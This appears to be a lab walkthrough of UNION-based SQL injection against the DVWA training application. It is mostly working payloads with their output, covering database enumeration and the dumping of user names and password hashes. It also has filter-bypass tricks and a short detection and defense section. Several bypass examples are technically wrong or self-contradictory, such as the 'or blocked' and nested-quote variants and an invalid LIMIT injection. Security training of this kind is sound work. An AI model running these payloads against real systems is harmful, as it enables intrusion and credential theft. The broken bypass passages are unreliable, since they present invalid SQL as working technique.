# UNION-Based SQL Injection

**Speed**: < 1 second  
**Requests per value**: 1  
**Detectability**: High (direct output)

## Overview

UNION-based SQLi works when:
1. Query output is displayed on page
2. Data types match across UNION columns
3. No output filtering/sanitization

## DVWA Vulnerable Parameter

```
GET /vulnerabilities/sqli/?id=1
```

### Vulnerable Code (PHP)
```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
```

## Exploitation Steps

### Step 1: Determine Number of Columns

```
Payload: 1 ORDER BY 1-- 
Result: ✓ Works (1 column exists)

Payload: 1 ORDER BY 2--
Result: ✓ Works (2 columns exist)

Payload: 1 ORDER BY 3--
Result: ✗ Error (3 columns don't exist)
```

**Conclusion**: 2 columns in query

### Step 2: Find Vulnerable Column (Reflects Data)

```
Payload: 1 UNION SELECT 1,2-- 
```

Expected output:
```
First Name: 1
Last Name: 2
```

Both columns reflect! Can extract data from either.

### Step 3: Extract Data

#### Extract Database Name
```sql
1 UNION SELECT database(), 2--
```

Output:
```
First Name: dvwa
Last Name: 2
```

#### Extract Current User
```sql
1 UNION SELECT user(), 2--
```

Output:
```
First Name: app@127.0.0.1
Last Name: 2
```

#### Extract Version
```sql
1 UNION SELECT version(), 2--
```

Output:
```
First Name: 5.7.30-0+deb9u1
Last Name: 2
```

#### List Tables
```sql
1 UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=database()--
```

Output:
```
First Name: guestbook, users, failed_logins
Last Name: 2
```

#### Extract Users Table

```sql
1 UNION SELECT GROUP_CONCAT(CONCAT(user,':',password)),2 FROM users--
```

Output:
```
First Name: admin:5f4dcc3b5aa765d61d8327deb882cf99,user:e99a18c428cb38d5f260853678922e03,...
Last Name: 2
```

## Full Extraction Payload

```sql
1 UNION SELECT 
  GROUP_CONCAT(CONCAT('ID:',user_id,' | USER:',user,' | PASS:',password,' | EMAIL:',email)),
  2 
FROM users--
```

This gets all users in single request:
```
First Name: ID:1 | USER:admin | PASS:5f4dcc3b5aa765d61d8327deb882cf99 | EMAIL:admin@dvwa.local,
           ID:2 | USER:user | PASS:e99a18c428cb38d5f260853678922e03 | EMAIL:user@dvwa.local,...
```

## Bypass Techniques

### Filter: "or" Blocked

Use `||` instead (MySQL OR operator):
```sql
1 UNION SELECT 1,2--
    ↓
1 || 1 SELECT 1,2--  (if "||" also blocked)
1 %7c%7c 1 SELECT 1,2--  (URL encoded)
```

### Filter: "--" Comments Blocked

Use `#` instead:
```sql
1 UNION SELECT 1,2--
    ↓
1 UNION SELECT 1,2#
```

Or use `/**/` comments:
```sql
1 UNION SELECT 1,2 /**/
```

### Filter: "select" Blocked (Case-sensitive)

Use uppercase:
```sql
1 UNION SELECT 1,2--
    ↓
1 UNION SeLeCt 1,2--
```

Or use nested quotes:
```sql
1 UNION SeLe"ct" 1,2--
```

### Filter: Spaces Blocked

Use `%20`, `+`, or `/**/`:
```sql
1 UNION SELECT 1,2--
    ↓
1 UNION/**/SELECT 1,2--
1+UNION+SELECT+1,2--
1%20UNION%20SELECT%201,2--
```

## DVWA Security Levels

### Low Level (No Protection)
```sql
1' UNION SELECT user,password FROM users-- 
```
Works directly.

### Medium Level (Basic Escaping)
```
Input: 1' UNION SELECT...
Result: Escapes single quote
Bypass: Use numeric instead
1 UNION SELECT...
```

### High Level (LIMIT + Escaping)

Original query structure:
```sql
SELECT first_name,last_name FROM users WHERE user_id = $id LIMIT 1
```

If LIMIT clause is present, UNION result appears at LIMIT offset.

**Problem**: `1 UNION SELECT...` returns UNION result, not original query result.

**Solution**: Use `LIMIT 1,1` to skip first result:

```sql
1' UNION SELECT user,password FROM users LIMIT 1,1--
```

Or craft injection at LIMIT itself:
```sql
1 LIMIT 1 UNION SELECT user,password FROM users--
```

## Python Exploitation Script

See: `union_sqli.py`

Usage:
```bash
python3 union_sqli.py

# Output:
# [*] Target: http://localhost/vulnerabilities/sqli/?id=
# [+] Database: dvwa
# [+] Current User: app@127.0.0.1
# [+] Users extracted:
#     admin:5f4dcc3b5aa765d61d8327deb882cf99
#     user:e99a18c428cb38d5f260853678922e03
```

## Detection & Defense

### Detection (WAF/IDS)
- `UNION` keyword in GET/POST
- `SELECT` + `FROM` patterns
- Multiple `--` or `#` in parameters
- Hex-encoded UNION payloads

### Defense
1. **Parameterized Queries** (Best)
   ```php
   $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$id]);
   ```

2. **Input Validation**
   - Whitelist numeric IDs: `if(!is_numeric($id)) die("Invalid ID");`
   - Length limits

3. **Output Encoding**
   - HTML encode output: `htmlspecialchars()`
   - Prevents XSS even if SQLi succeeds

4. **Error Handling**
   - Never show SQL errors to users
   - Log errors internally

## Performance Analysis

| Aspect | Value |
|--------|-------|
| Requests per hash | 1 |
| Time to extract 5 users | < 1 second |
| Detectability (IDS) | Very High |
| Automation ease | Very Easy |
| Reliability | Very High |

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
